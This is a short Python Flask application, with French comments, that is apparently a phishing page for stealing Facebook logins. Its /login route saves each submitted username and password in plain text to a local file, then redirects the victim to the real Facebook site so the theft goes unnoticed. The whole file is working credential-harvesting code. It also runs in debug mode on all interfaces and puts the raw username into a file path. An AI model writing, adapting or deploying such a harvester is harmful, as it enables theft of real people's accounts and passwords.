from flask import Flask, render_template, request, redirect, url_for
import random
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    os.makedirs("password text", exist_ok=True)
    username = request.form['username']
    password = request.form['password']
    data = f"Username : {username} \nPassword : {password}"

    lettre = "0123456789"
    lenght = 4
    numb = ''.join(random.sample(lettre,lenght))
    chemin = "password text/"+username+numb+'.txt'

    # save data
    with open(chemin,"a") as f:
        f.write(data)
    
    print("Donnée enregistré")

    # Rediriger vers le lien
    return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
